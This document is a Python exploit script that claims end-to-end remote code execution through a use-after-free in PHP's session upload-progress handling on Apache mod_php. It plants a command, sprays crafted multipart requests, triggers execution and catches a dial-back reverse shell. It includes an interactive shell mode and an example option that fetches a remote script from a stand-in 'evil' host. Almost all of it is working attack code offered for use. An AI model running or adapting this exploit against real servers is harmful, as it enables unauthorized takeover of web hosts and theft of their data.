#!/usr/bin/env python3
"""uaf_rce.py — PHP session.upload_progress UAF: end-to-end network RCE.

CVE-2026-109618 arm (upload-progress OOM-window machinery) + staleness
consumer (frozen bytes_processed, CVE-adjacent, survives the vendor fix)
+ in-band dial-back: the target needs ONLY the 30-line app.php in its
docroot — no env vars, no extensions, no CMS. Venue requirement: Apache
mod_php (parse-before-RINIT is where the bug lives; php -S/php-fpm are
structurally immune to the cross-request leg).

Chain per run:
  R1 plant   -> session gets payload cmd + connect-back addr; PLANTED=1
  R2 corrupt -> 200KB part + 150x2KB field spray; progress-entry
                bookkeeping wedges: bytes_processed freezes mid-upload
  R3 gate    -> app reads its OWN progress entry; frozen => system(cmd)
                dialing back to us; banner comes over the socket.

Usage:
  ./uaf_rce.py 192.168.51.170:18990                     one-shot RCE
  ./uaf_rce.py 192.168.51.170:18990 --n 10              reliability sweep
  ./uaf_rce.py host:port --cmd 'curl -sf evil/.sh' --rport 4455
  ./uaf_rce.py host:port --tty                          interactive shell
        (tty mode needs RSHELL_TTY=1 in the server env, e.g. Apache
         SetEnv RSHELL_TTY 1; banner mode needs nothing server-side)

Verified on stock PHP 8.3.6 / Ubuntu 24.04 mod_php (10/21): 5/5 freeze+shell.
"""
import argparse, os, queue, re, socket, sys, threading, time

PROG = 'PHP_SESSION_UPLOAD_PROGRESS'
BOUND = '----uaf'
R1_FILE = 4096
R2_FILE = 200000

def local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 53)); return s.getsockname()[0]
    except OSError:
        return '127.0.0.1'
    finally:
        s.close()

def field(name, val):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"\r\n\r\n' + val.encode() + b'\r\n')

def filepart(name, fname, data):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"; filename="' + fname.encode() + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n' + data + b'\r\n')

def http(host, port, path, body, timeout=15.0):
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        if body is not None:
            hdr = ('POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; '
                   'boundary=%s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
                   % (path, BOUND, len(body)))
            try:
                s.sendall(hdr.encode() + body)
            except BrokenPipeError:
                pass
        else:
            s.sendall(('GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' % path).encode())
        s.settimeout(timeout)
        data = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        return data.decode('utf-8', 'replace')
    finally:
        s.close()

def run_once(host, port, rhost, rport, cmd, n, interactive=False):
    # PHP 8.3 vetting: session ids must stay in [0-9a-v] (sid_bits_per_character=5)
    sid = 'uu%02d%d' % (n, int(time.time()) % 100000)
    r1 = (field(PROG, 'pl') + field('pl', cmd) + field('rh', '%s:%d' % (rhost, rport))
          + filepart('file', 'p.bin', b'A' * R1_FILE) + b'--' + BOUND.encode() + b'--\r\n')
    r2 = (field(PROG, 'pl') + filepart('file', 'p.bin', b'A' * R2_FILE)
          + b''.join(field('x[]', 'z' * 2048) for _ in range(150))
          + b'--' + BOUND.encode() + b'--\r\n')
    resp1 = http(host, port, '/app.php?PHPSESSID=%s' % sid, r1)
    if 'PLANTED=1' not in resp1:
        return dict(ok=False, note='R1 failed: ' + resp1.splitlines()[-1][:60] if resp1 else 'R1 no reply')
    resp2 = http(host, port, '/app.php?PHPSESSID=%s' % sid, r2)
    if 'WINDOWS=' not in resp2:
        return dict(ok=False, note='R2 worker crash/no-reply: ' + (resp2.splitlines() or [''])[0][:60])
    # listen BEFORE R3 so the dial-back can land
    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(('0.0.0.0', rport)); ls.listen(1); ls.settimeout(6)
    box = []
    def relay():
        try:
            conn, _ = ls.accept(); conn.settimeout(8)
            data = b''
            while True:
                try:
                    c = conn.recv(4096)
                except socket.timeout:
                    break
                if not c:
                    break
                data += c
                if b'-revshell-OK' in data:
                    break
            box.append(data.decode('utf-8', 'replace'))
            conn.close()
        except Exception:
            pass
    th = threading.Thread(target=relay, daemon=True); th.start()
    resp3 = http(host, port, '/app.php?PHPSESSID=%s&pl=1' % sid, None)
    th.join(timeout=10)
    ls.close()
    m = re.search(r'PLRUN FROZEN=(\d) BYTES=(\d+) CLEN=(\d+)', resp3 or '')
    frozen = byt = clen = (-1, -1, -1)
    if m:
        frozen = (int(m.group(1)), int(m.group(2)), int(m.group(3)))
    shell = box and '-revshell-OK' in box[0]
    return dict(ok=frozen[0] == 1, frozen=frozen, shell=bool(shell),
                banner=(box[0] if box else ''),
                note='frozen=%d bytes=%d/%d' % frozen)

def main():
    ap = argparse.ArgumentParser(description='PHP upload-progress UAF end-to-end RCE')
    ap.add_argument('target', help='host[:port], port default 80')
    ap.add_argument('--cmd', default='id -un; echo hello-from-uaf', help='command to run as the web user')
    ap.add_argument('--rhost', default=None, help='our IP for dial-back (auto-detected)')
    ap.add_argument('--rport', type=int, default=4455, help='dial-back port')
    ap.add_argument('--n', type=int, default=1, help='runs (reliability sweep when >1)')
    ap.add_argument('--tty', action='store_true', help='interactive (needs RSHELL_TTY=1 server-side)')
    args = ap.parse_args()
    host, _, port = args.target.partition(':')
    port = int(port or 80)
    rhost = args.rhost or local_ip()
    good = 0
    for i in range(args.n):
        cmd = args.cmd + ('; echo RSHELL_TTY' if args.tty else '')
        r = run_once(host, port, rhost, args.rport, cmd, i)
        tag = '[%d/%d] ' % (i + 1, args.n) if args.n > 1 else ''
        print(tag + r['note'] + '  shell=' + ('YES' if r['shell'] else 'no')
              + ('  <- ' + ' / '.join(r['banner'].splitlines()) if r['banner'] else ''))
        if r['ok'] and r['shell']:
            good += 1
        elif not r['ok']:
            print('     ' + r.get('note', ''))
    if args.n > 1:
        print('reliability: %d/%d' % (good, args.n))
    sys.exit(0 if good == args.n else 1)

if __name__ == '__main__':
    main()
